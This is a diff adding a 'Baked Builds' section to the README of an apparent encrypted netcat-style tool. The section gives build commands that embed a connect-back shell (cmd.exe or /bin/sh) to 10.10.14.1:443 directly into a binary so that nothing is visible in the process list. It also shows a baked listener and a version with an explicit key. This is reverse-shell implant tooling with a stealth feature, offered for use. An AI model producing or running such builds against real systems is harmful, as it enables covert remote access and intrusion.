@@ -121,6 +121,23 @@ echo "secret message" | ./grotto -c 10.10.14.1 -p 4444 -k $KEY
 
 > Both sides must use the same 256-bit pre-shared key (64 hex characters). The key is zeroed from memory on exit.
 
+### Baked Builds
+
+Compile configuration directly into the binary — no CLI arguments needed, nothing visible in the process list.
+
+```bash
+# Baked connect-back with encrypted shell
+./build.sh --baked -c 10.10.14.1 -p 443 -e cmd.exe
+
+# Baked listener
+./build.sh --baked -l -p 4444 -e /bin/sh
+
+# Baked with explicit key
+./build.sh --baked -c 10.10.14.1 -p 443 -k <64-hex-chars> -e cmd.exe
+```
+
+> The baked binary runs with zero arguments. Host, port, key, and exec command are embedded at compile time. A random PSK is generated if `-k` is not provided.
+
 ---
 
 ## Architecture
